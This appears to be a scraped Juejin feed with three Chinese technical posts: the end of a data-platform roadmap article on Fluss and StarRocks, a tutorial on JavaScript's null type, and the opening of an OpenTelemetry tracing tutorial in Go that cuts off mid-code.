<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d39c97fd91264277985595e4cafd3310~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892953&amp;x-signature=ze2p9fL2dCEEp17Fw2W4mOcJeq8%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-25">6.1、Fluss</h3>
<ol>
<li>
<p>当Fluss兼容kafka的协议后，我们会把原来cdc数据写入kafka的过程直接换成Fluss，毕竟kafka中的数据探查是一个非常困难的点，而且kafka没有schema概念，对于一些元数据转换自动化不是很理想，希望通过Fluss可以解决我们遇到的痛点。</p>
</li>
<li>
<p>Fluss结合Lance 做AI数据基座。</p>
</li>
</ol>
<p>3、Fluss 支持 AGG Table 和 RoaringBitmap 可以为我们实时计算UV，代价更小，成本更低。 </p>
<h3 data-id="heading-26">6.2、StarRocks存算分离</h3>
<p>随着业务体量的增加和复杂度的提高，尤其是AI部分对于数仓模型产出的数据的需求越来越强烈，我们越来越需要资源进行隔离的硬需求或者用户独享资源，目前StarRocks中的存算分离支持计算资源的硬隔离，我们还能把OLAP和AI部分的需求（RAG、数据需求）的检索放在StarRocks中加速查询，各自业务域互不影响。开启存算分离后，数据只需要存储一份，数据合并压力减少。</p>
<h3 data-id="heading-27">6.3、增量计算</h3>
<p>增量计算一直是我们一个比较关注的点，我们希望最大化的节省成本和技术复杂度，对于一些历史数据，完全可以使用增量计算来进行代替，不是所有的数据都是需要准实时，参考SnowFlake、Hologres、Flink物化表等产品均已支持增量计算，除了Flink物化表可以做到秒级别的增量计算，数据库级别的增量计算目前还是分钟级别，但综合对比来说，Flink的物化表的成本相比在数据库层面的集成成本会偏高。我们希望在StarRocks同样做到增量计算，减少维护成本和计算，很高兴的是有看到StarRock的有这一明确的探讨和计划。</p>
<h3 data-id="heading-28">6.4、半结构化数据-数据列存</h3>
<p>目前我们的睿人事系统部分数据是JSON数据结构结构，且JSON中的key是动态不固定，这使得解析、输出这些数据都是比较耗费资源的操作，目前StarRocks已支持Flat Json对半结构化数据进行数据列存，但目前受限于这个参数是整个实例的开启，我们更需要的是表级别的参数，目前StarRocks已进化到Flat Json V2（4.0已支持），我们将会持续跟进关注StarRocks种对于半结构化数据的能力和我们内部能实际使用的场景和能力。</p>
<p>社区方向，目前业界主要是半结构化数据-数据列存，variant字段类型，目前StarRocks已有pr支持；variant字段兼容的数据类型会比JSON更丰富，我们会持续跟进。 </p>
<h3 data-id="heading-29">6.5、DATA+AI</h3>
<p>AI越来越火热，我们的业务复杂度也是在慢慢提升，随着Lance的火热，我们也思考和探索在AI的数据基座这部分也能和大数据这部分做到统一，目前paimon社区和Fluss已经开始集成lance，这样对我们的架构和技术栈的侵入是最小的，等后续dlf和Fluss集成后，我们依然参考可以使用现有的架构和技术完成DATA+AI的能力。</p>
<h2 data-id="heading-30">致谢：</h2>
<p>由衷的感谢阿里云DLF、VVR-Flink、VVR-Flink-CDC、EMR-StarRocks、Fluss、MaxCompute、DataWorks、StarRocks社区等团队在本次实践过程中提供的帮助和协作。</p>
<h2 data-id="heading-31">参考文档</h2>
<p>[1] <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.flink-forward.org%2Fabout%23flink-forward" target="_blank" title="https://www.flink-forward.org/about#flink-forward" ref="nofollow noopener noreferrer">www.flink-forward.org/about#flink…</a></p>
<p>[2] <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.starrocks.io%2Fzh%2Fdocs%2Fintroduction%2FStarRocks_intro%2F" target="_blank" title="https://docs.starrocks.io/zh/docs/introduction/StarRocks_intro/" ref="nofollow noopener noreferrer">docs.StarRocks.io/zh/docs/int…</a></p>
<p>[3] <a href="https://link.juejin.cn?target=https%3A%2F%2Ffluss.apache.org%2Fdocs%2Fnext%2F" target="_blank" title="https://fluss.apache.org/docs/next/" ref="nofollow noopener noreferrer">Fluss.apache.org/docs/next/</a></p>
<p>[4] <a href="https://link.juejin.cn?target=https%3A%2F%2Fnightlies.apache.org%2Fflink%2Fflink-cdc-docs-master%2F" target="_blank" title="https://nightlies.apache.org/flink/flink-cdc-docs-master/" ref="nofollow noopener noreferrer">nightlies.apache.org/flink/flink…</a></p>
<p>[5] <a href="https://link.juejin.cn?target=https%3A%2F%2Fnightlies.apache.org%2Fflink%2Fflink-docs-release-2.0%2F" target="_blank" title="https://nightlies.apache.org/flink/flink-docs-release-2.0/" ref="nofollow noopener noreferrer">nightlies.apache.org/flink/flink…</a></p>
<p>[6]<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FbDb9OUuhgwr_NQvVkv3HEw" target="_blank" title="https://mp.weixin.qq.com/s/bDb9OUuhgwr_NQvVkv3HEw" ref="nofollow noopener noreferrer">mp.weixin.qq.com/s/bDb9OUuhg…</a></p>
<p>[7]<a href="https://link.juejin.cn?target=https%3A%2F%2Fyunqi.aliyun.com%2F" target="_blank" title="https://yunqi.aliyun.com/" ref="nofollow noopener noreferrer">yunqi.aliyun.com/</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript的数据类型 —— Null类型]]></title>    <link>https://juejin.cn/post/7602914378389667850</link>    <guid>https://juejin.cn/post/7602914378389667850</guid>    <pubDate>2026-02-05T09:13:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602914378389667850" data-draft-id="7599828354515304488" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScript的数据类型 —— Null类型"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2026-02-05T09:13:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="橘朵"/> <meta itemprop="url" content="https://juejin.cn/user/1099989273025416"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScript的数据类型 —— Null类型
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1099989273025416/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    橘朵
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T09:13:37.000Z" title="Thu Feb 05 2026 09:13:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 JavaScript 中，<code>Null</code>类型是一个基本数据类型，它只有一个唯一的值：<code>null</code>。通常被用来表示一个<strong>有意为之的、不指向任何对象值的空值</strong>。逻辑上讲，<code>null</code>值表示一个<strong>空对象指针</strong>，这也是给<code>typeof</code>传一个<code>null</code>会返回"<code>object</code>"的原因。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">let</span> car = <span class="hljs-literal">null</span>; 
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> car); <span class="hljs-comment">// "object"，JavaScript的历史遗留 Bug，不代表null是对象</span>
<span class="hljs-comment">//具体原因:不同的对象在底层都表现为二进制，</span>
<span class="hljs-comment">//在 JavaScript 中二进制前三位都为 0 的话会被判断为 object 类型， </span>
<span class="hljs-comment">//null 的二进制全部为 0，自然前三位也是 0，</span>
<span class="hljs-comment">//所以执行 typeof 值会返回 object。</span>
</code></pre>
<p><strong>在定义将来要保存对象值的变量时，建议使用<code>null</code>来初始化，不要使用其他值。</strong> 这样，只要检查这个变量的值是不是 <code>null</code> 就可以知道这个变量是否在后来被重新赋予了一个对象的引用。</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">if</span> (car != <span class="hljs-literal">null</span>) {  
 <span class="hljs-comment">// car 是一个对象的引用 </span>
} 
</code></pre>
<p><strong>初始化变量</strong>：预先声明一个变量，并明确表示它暂不指向任何对象。</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">let</span> futureObject = <span class="hljs-literal">null</span>; <span class="hljs-comment">// 表明该变量准备在将来容纳一个对象</span>
</code></pre>
<p><strong>清空对象引用</strong>：当一个对象不再需要时，将其引用设置为 <code>null</code>，这有助于垃圾回收机制释放内存。</p>
<pre><code class="hljs language-ini" lang="ini">let <span class="hljs-attr">myHeavyObject</span> = { ... }<span class="hljs-comment">; // 一个占用大量内存的对象</span>
// ... 使用完成后
<span class="hljs-attr">myHeavyObject</span> = null<span class="hljs-comment">; // 断开引用，提示可以回收内存</span>
</code></pre>
<p><strong>函数的返回值</strong>：当函数没有找到有效结果或操作失败时，返回 <code>null</code>来表示"无"。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">findUser</span>(<span class="hljs-params">id</span>) {
  <span class="hljs-keyword">const</span> user = users.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">u</span> =&gt;</span> u.<span class="hljs-property">id</span> === id);
  <span class="hljs-keyword">return</span> user || <span class="hljs-literal">null</span>; <span class="hljs-comment">// 找到用户返回用户对象，否则返回 null</span>
}
</code></pre>
<p><strong>DOM 操作</strong>：在获取不存在的 DOM 元素时，通常会返回 <code>null</code>。</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">nonExistentElement</span> = document.getElementById(<span class="hljs-string">'does-not-exist'</span>)<span class="hljs-comment">;</span>
console.log(nonExistentElement)<span class="hljs-comment">; // null</span>
</code></pre>
<p><strong>如何安全地检测与处理</strong> <strong><code>null</code></strong> <strong>？</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">//正确检测 null</span>
<span class="hljs-comment">//由于 typeof的 Bug，最可靠的方法是使用严格相等运算符（===）</span>
<span class="hljs-keyword">if</span> (myVar === <span class="hljs-literal">null</span>) {
  <span class="hljs-comment">// 明确处理 myVar 为 null 的情况</span>
}

<span class="hljs-comment">//安全地访问可能为 null的属性</span>
<span class="hljs-comment">//在尝试访问 null（或 undefined）的属性时，JavaScript 会抛出 TypeError。</span>
<span class="hljs-comment">//可选链操作符（?.） ：如果遇到 null或 undefined就立即停止访问，返回 undefined</span>
<span class="hljs-keyword">let</span> name = user?.profile?.name; <span class="hljs-comment">// 如果 user 或 profile 为 null/undefined，name 则为 undefiend</span>
<span class="hljs-comment">//空值合并操作符（??） ：为 null或 undefined提供一个默认值</span>
<span class="hljs-keyword">let</span> displayName = user?.profile?.name ?? <span class="hljs-string">'匿名用户'</span>; <span class="hljs-comment">// 如果名字为空，则显示'匿名用户'</span>
</code></pre>
<p><strong>与</strong> <strong><code>undefined</code></strong> <strong>的区别</strong></p>
<p><code>undefined</code>值是由<code>null</code>值派生而来的，在ECMA-262将它们定义为表面上相等。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-literal">null</span> == <span class="hljs-literal">undefined</span>); <span class="hljs-comment">// true</span>
</code></pre>
<p>即使<code>null</code>和<code>undefined</code>有关系，它们的用途也是完全不一样的。不要显式地将变量值设置为<code>undefined</code>，当我们试图访问某个不存在的或者没有赋值的变量时，就会得到一个 <code>undefined</code> 值。Javascript 会自动将声明时没有进行初始化的变量设为 <code>undifined</code>。</p>
<p>但<code>null</code>任何时候，只要<strong>变量要保存对象</strong>，而当时又没有那个对象可保存，就要用<code>null</code>来填充该变量。null 不能通过 Javascript 来自动赋值，也就是说必须要我们自己手动来给某个变量赋值为 <code>null</code>。这样就可以保持<code>null</code>是空对象指针的语义，并进一步与<code>undefined</code>区分开来。</p>
<p>虽然 <code>undefined</code>和 <code>null</code>在非严格相等比较（<code>==</code>）时结果为 <code>true</code>，但它们有本质的不同。</p>






























<table><thead><tr><th><strong>特性</strong></th><th><strong>undefined</strong></th><th><strong>null</strong></th></tr></thead><tbody><tr><td>含义</td><td>表示变量处于自然的、未初始化的原始状态。</td><td>表示一个被人为主动赋值的空对象指针，代表"空值"。</td></tr><tr><td>数据类型</td><td><code>typeof</code>返回 "undefined"。</td><td><code>typeof</code>返回 "object"（这是历史遗留问题）。</td></tr><tr><td>严格相等</td><td><code>undefined === null</code>的结果为 false。</td><td/></tr><tr><td>转换为数字</td><td><code>Number(undefined)</code>的结果是 NaN。</td><td><code>Number(null)</code>的结果是 0。</td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入 OpenTelemetry 源码与实战（下篇）]]></title>    <link>https://juejin.cn/post/7603030564838146102</link>    <guid>https://juejin.cn/post/7603030564838146102</guid>    <pubDate>2026-02-05T09:26:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603030564838146102" data-draft-id="7603010441149612073" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入 OpenTelemetry 源码与实战（下篇）"/> <meta itemprop="keywords" content="后端,Go"/> <meta itemprop="datePublished" content="2026-02-05T09:26:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="下次一定57"/> <meta itemprop="url" content="https://juejin.cn/user/3722294009017404"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入 OpenTelemetry 源码与实战（下篇）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3722294009017404/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    下次一定57
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T09:26:22.000Z" title="Thu Feb 05 2026 09:26:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>通过上篇的源码拆解，我们已经掌握了 <code>OpenTelemetry</code> 的核心初始化逻辑，接下来本节将进行<strong>本地链路的快速实战</strong>，验证我们的初始化代码是否有效，同时掌握最基础的 <code>Span</code> 创建、链路记录方法。 为了避免代码冗余，本节将直接复用上篇实现的 <code>InitTracerProvider</code> 初始化函数（大家可以将上篇的 <code>trace</code> 包代码复制到当前项目中，或直接引用对应包）。我们会构建一个简单的本地调用链路，创建父子/平级 <code>Span</code>，添加自定义属性和事件，最后通过 <code>Jaeger UI</code> 查看追踪结果，快速上手 <code>OpenTelemetry</code> 的基础使用。</p>
<h2 data-id="heading-1">本地链路快速落地</h2>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"context"</span>
	<span class="hljs-string">"encoding/json"</span>
	<span class="hljs-string">"fmt"</span>
	<span class="hljs-string">"go.opentelemetry.io/otel"</span>
	<span class="hljs-string">"go.opentelemetry.io/otel/attribute"</span>
	<span class="hljs-string">"golang.org/x/sync/errgroup"</span>
	<span class="hljs-string">"time"</span>
)
<span class="hljs-comment">// 记录链路</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">funcA</span><span class="hljs-params">(ctx context.Context)</span></span> {
	tr := otel.Tracer(<span class="hljs-string">"basic_name"</span>)
	_, span := tr.Start(ctx, <span class="hljs-string">"func-a"</span>)
    <span class="hljs-comment">// 这里就是为这个 span 本身添加属性 也就是 只有 funcA 能看到 main 和 funcB 看不到 可以看一下运行结果</span>
    <span class="hljs-comment">// 等大家看完 Start 源码 返回的时候 内部会加上 自己设置的 Attributes 和 Event </span>
	span.SetAttributes(attribute.String(<span class="hljs-string">"name"</span>, <span class="hljs-string">"funA"</span>))
    span.AddEvent(<span class="hljs-string">"完成 funcA"</span>)
	time.Sleep(time.Second)
	span.End()
}
<span class="hljs-comment">// 记录链路</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">funcB</span><span class="hljs-params">(ctx context.Context)</span></span> {
	tr := otel.Tracer(<span class="hljs-string">"basic_name"</span>)
	_, span := tr.Start(ctx, <span class="hljs-string">"func-b"</span>)
	fmt.Println(<span class="hljs-string">"trace:"</span>, span.SpanContext().TraceID(), span.SpanContext().SpanID())
	time.Sleep(time.Second)
	span.End()
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
	tp, _ := InitTracerProvider(common.Options{
		Name:     <span class="hljs-string">"basic_name"</span>,   <span class="hljs-comment">//唯一的服务号</span>
		Endpoint: <span class="hljs-string">"http://127.0.0.1:14268/api/traces"</span>,  <span class="hljs-comment">// 换成自己服务器的ip地址</span>
		Sampler:  <span class="hljs-number">1</span>,   <span class="hljs-comment">//这里就全采样用于学习测试</span>
		Batcher:  <span class="hljs-string">"jaeger"</span>,
	})
	ctx := context.Background()  <span class="hljs-comment">//定义 主 context</span>
    <span class="hljs-comment">// 最后必须要关闭 大家看过上面源码就知道 这个关闭类型是 sync.Once 无论调用多少次 都只执行一次</span>
	<span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {
		ctx, cancel := context.WithTimeout(context.Background(), <span class="hljs-number">5</span>*time.Second)
		<span class="hljs-keyword">defer</span> cancel()
		_ = tp.Shutdown(ctx)
	}()
	<span class="hljs-comment">// 重点逻辑 在这里 第一次的话 会生成 TracerID 这条请求中核心参数，会一直传递下去 下面有源码解读</span>
	tr := otel.Tracer(<span class="hljs-string">"basic_name"</span>)
	spanCtx, span := tr.Start(ctx, <span class="hljs-string">"func-main"</span>)
    <span class="hljs-comment">/*
     errgroup 不懂的话 我之前文章介绍过 这个非常好用 以后就可以把 sync.WaitGroup 替换成 errgroup 
     不需要去写 add 和 done，因为内部都做了  下面代码其实就是开了两个协程并行执行而已
     */</span>
